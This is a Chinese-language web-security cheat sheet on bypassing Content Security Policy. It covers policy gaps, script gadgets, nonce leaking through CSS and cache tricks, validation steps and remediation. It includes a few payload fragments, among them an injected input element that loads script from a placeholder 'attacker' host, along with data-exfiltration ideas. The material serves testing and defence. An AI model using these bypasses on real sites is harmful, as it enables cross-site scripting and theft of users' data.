# CSP 绕过

> CSP 不是"防 XSS 的开关"，而是"缩小 XSS 可利用面"。绕过路径有三类：**策略配置缺口**、**脚本 gadget（nonce 也被绕过）**、**浏览器/缓存行为异常**。

## 一、先读策略

看响应头 `Content-Security-Policy`（以及 `-Report-Only`）：

- `default-src`/`script-src` 是否含 `'unsafe-inline'`、`'unsafe-eval'`、`data:`、`http:`、`*`
- 是否用 `nonce-` + `'strict-dynamic'`
- `object-src`/`base-uri`/`frame-ancestors` 是否缺失或宽松
- 是否提交到 `report-uri`（可用作探测信号）

**没有 `base-uri` + 有 `<base>` 注入** → 可劫持相对路径脚本加载。

## 二、配置缺口绕过（最实用）

| 缺口 | 手法 |
|---|---|
| `script-src 'self'` | 上传 JS 到同源（见 `../File-Upload/Upload-to-RCE-Chains.md`）；或用同源的 JSONP/回调参数 |
| `'unsafe-inline'` | 直接内联脚本 |
| `script-src` 含 whitelisted CDN | 找该 CDN 上的可用的"用户内容托管"或 JSONP 端点（AngularJS/旧版库 gadget） |
| `'nonce-...'` 且页面有反射 | nonce 复用（见下文） |
| `object-src` 缺失 | `<object data="data:text/html,...">`（老浏览器） |
| `default-src` 宽松但 `script-src` 收紧 | 用允许的 schema（`data:`、`blob:`） |
| `frame-ancestors` 缺失 | 框架嵌套 + 点击劫持组合 |
| `require-trusted-types-for` 未启用 | 直接 `innerHTML` sink |

## 三、Script gadget（绕过 nonce/strict-dynamic）

思路：页面上**已被允许执行的脚本**如果读取可控数据并把它变成代码/URL，就能借用它的执行权限。

典型 gadget 类型：

1. **DOM-XSS 型**：`document.querySelector("[id^='x-']").value` → `script.src = value`（PortSwigger 在自家页面发现的真实案例：注入 `<input id="RecaptchaClientUrl-" value="//attacker/x.js">` 即可）。
2. **内库 gadget**：Angular（`ng-app` + 表达式）、jQuery（`$(location.hash)`）、Vue 模板编译、旧版 React `dangerouslySetInnerHTML` 之外的 `href` 注入。
3. **JSONP / 回调参数**：`callback=`、`jsonp=`、`_callback=`。
4. **DOM clobbering + node-removal gadget**：用 HTMLCollection 覆盖全局对象，再借库的节点移除逻辑在运行时把转义函数置空，随后走 `innerHTML`/iframe 属性注入 sink —— 可**绕过 DOMPurify**（Mizu "Under the Beamer" 2025）。
5. **隐式类型转换**：`toString`/`valueOf` gadget 链（Vega CVE-2025-59840）可从表达式沙箱逃逸到 `eval`，变体还能实现**无参数函数调用**从而绕过 WAF。

探测方法（实用）：用动态分析（Burp 扫描器的 DOM 分析、Chrome DevTools 断点）寻找"从可控源到代码 sink 的数据流"；静态 grep：`src =`、`innerHTML`、`eval`、`setTimeout(`（字符串形式）、`insertAdjacentHTML`。

## 四、nonce 获取/复用（2025 新）

1. **CSS 泄露 nonce**：用攻击者控制的 CSS（在被嵌入资源的 URL、`@import`、属性选择器）逐字符探测 nonce 值 → 再用它注入脚本。
2. **Disk cache / bfcache**：强制 bfcache 回退到 disk cache，使**已泄漏的 nonce 与可注入的 fetch 内容以同一缓存键**被重新缓存（Jorian Woltjer 2025）。核心是操纵 cache key，让"被缓存的 nonce 版本"与"新请求"匹配。
3. **嵌套响应拆分**：把 CRLF 注入链成同源脚本加载，再二次拆分产生截断 JS，绕过 `Content-Length`/`Transfer-Encoding` 校验（CSPT 2025）。
4. **可信第三方**：把 `connect-src` 允许的分析平台当作数据外带通道（New Relic 案例：把带 token 的 POST 重定向到该平台，再用其错误日志采样取回 JSON）。

## 五、验证（最小证据）

1. 策略原文（Header 值）。
2. 绕过 payload + 在**真实浏览器**中执行证据（弹窗/ DOM 变更 / console 输出 / 网络请求到攻击者域）。
3. 若用 gadget：给出 gadget 的源码位置与数据流（哪一行把可控值变成代码）。
4. 若用 nonce 复用：给出 nonce 泄漏步骤与最终注入的完整时序。

## 六、常见误报

- 只看到 CSP console 报错，脚本实际**未执行**。
- 在 `Report-Only` 模式下测试（策略未生效）→ 需确认是强制模式。
- 用浏览器扩展/开发者工具禁用 CSP 后测出"绕过"。
- `data:`/`blob:` 注入在支持 `strict-dynamic` + 现代浏览器中已被忽略。

## 七、修复

- nonce 每次响应用 CSPRNG 生成、不复用；配合 `strict-dynamic`；同时设置 `object-src 'none'`、`base-uri 'none'`、`frame-ancestors`。
- 消除 script gadget：禁止用可控数据构造 `script.src`/`href`/`innerHTML`；引入 Trusted Types。
- 敏感响应禁用缓存（`no-store`）或使用 `Clear-Site-Data`。
- 净化器（DOMPurify 等）保持最新 + 服务端二次净化 + 输出编码。
- 不要把第三方分析/客服域加入 `script-src`/`connect-src` 后当"可信"。

## 参考

- PortSwigger：Hunting nonce-based CSP bypasses with dynamic analysis、CSP 研究、Under the Beamer（2025）、Vega CVE-2025-59840（2025）
- Jorian Woltjer：Nonce CSP bypass using Disk Cache（2025）
- CTBB Lab：Bypassing CSP with New Relic Custom Events / Nested Response Splitting（2025）
